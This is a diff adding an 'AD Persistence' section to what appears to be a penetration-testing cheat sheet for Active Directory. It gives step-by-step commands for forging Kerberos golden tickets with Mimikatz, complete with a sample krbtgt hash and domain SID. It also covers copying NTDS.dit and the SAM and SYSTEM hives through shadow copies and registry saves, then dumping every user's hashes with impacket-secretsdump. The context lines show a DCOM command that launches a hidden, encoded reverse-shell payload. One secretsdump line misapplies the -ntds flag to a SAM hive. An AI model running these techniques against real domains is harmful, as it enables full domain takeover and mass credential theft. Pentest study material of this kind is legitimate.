@@ -273,5 +273,48 @@ Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Creat
 	$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP>")) 
 	$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop –w hidden –e <base64-encoded-revshell-payload>","7")
 	```
+#### AD Persistence
+- **Golden Ticket**
+	- Requirements - krbtgt password hash
+	- If we are able to get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, also known as golden tickets.
+	- While Silver Tickets aim to forge a TGS ticket to access a specific service, Golden Tickets give us permission to access the entire domain’s resources. Once TGT is created, the owner user, even non-privileged user, can be stated as member of Domain Admins group.
+	- SPN password hash
+        - `Mimikatz> privilege::debug`
+		- `Mimikatz> lsadump::lsa /patch`
+            - `iis_krbtgt:4d28cf5252d39971419580a51484ca09`
+			- Can also get domain SID here  → `S-1-5-21-1987370270-658905905-1781884369`
+	- Domain SID
+        - `whoami /user` → `S-1-5-21-1987370270-658905905-1781884369`
+	- Golden Ticket
+        - `Mimikatz> kerberos::purge`  → current session tickets purged
+		- `Mimikatz> kerberos::golden /domain:<domain> /user:<username> /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:4d28cf5252d39971419580a51484ca09 /ptt`
+            - `/ptt` -> inject the forged ticket into the memory of the machine we execute the command on.
+			- Our user ID is set to 500 by default, which is the RID of the built-in administrator for the domain, while the values for the groups ID consist of the most privileged groups in Active Directory, including the Domain Admins group.
+        - `PS> klist` → Ticket list will contain new TGT ticket.
+        - `Mimikatz> misc::cmd`  → Launched new command prompt as `<username>` stated as part of Domain Admins group.
+        - `PS> .\PsExec64.exe \\DC1 cmd.exe` -> Alternative to launch command prompt
+- **Shadow Copies**
+    - If we get access to DC, get a Shadow Copy to get credentials of all users in all systems
+	- A Shadow Copy, also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes.
+	- As domain admins, we have the ability to abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database NTDS.dit database file. Once we’ve obtained a copy of said database, we can extract every user credential offline on our local Kali machine.
+	- Connect to DC as domain admin user
+	- `PS> vshadow.exe -nw -p C:` → Get Shadow copy device name something like `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy` from output of this command
+		- Alternative - vssadmin create shadow /for=C: (Pre-installed)
+			- `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy`
+			- `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy`
+	- `PS>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit`
+	- `PS> reg.exe save hklm\system c:\system.hive` → `system.hive` from Windows registry is password key for `ntds.dit` database
+	- `Kali> impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL` → Get NTLM hashes and Kerberos keys for every AD user
+![Screenshot of Shadow Copy 1](./images/shadow-1.png)
+	- `Kali> impacket-secretsdump -ntds ntds.dit -system system.hive -history LOCAL`
+		- `-history` shows along with current hashes, older hashes as well. Those are stored, so that repetition of setting same hash can be provided.
+	- Alternative for this is that we can use mimikatz to dump password of every user using `DCSync attack`.
+	- Alternative Method
+		- Backup SAM and SYSTEM hashes
+	        - `reg save hklm\system C:\system.hive`
+            - `reg save hklm\sam C:\sam.hive`
+        - Transfer system.hive and sam.hive to attacker’s machine
+        - `impacket-secretsdump -ntds sam.hive -system system.hive LOCAL` → Get Administrator user hash
+    - We can also execute command - `Get-ChildItem -Path C:\ -Include sam,system,ntds.dit -File -Recurse -ErrorAction SilentlyContinue` - to identify locations of these files.
 #### Some Awesome References
 - [PayloadsAllTheThings AD](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-enumerate/)
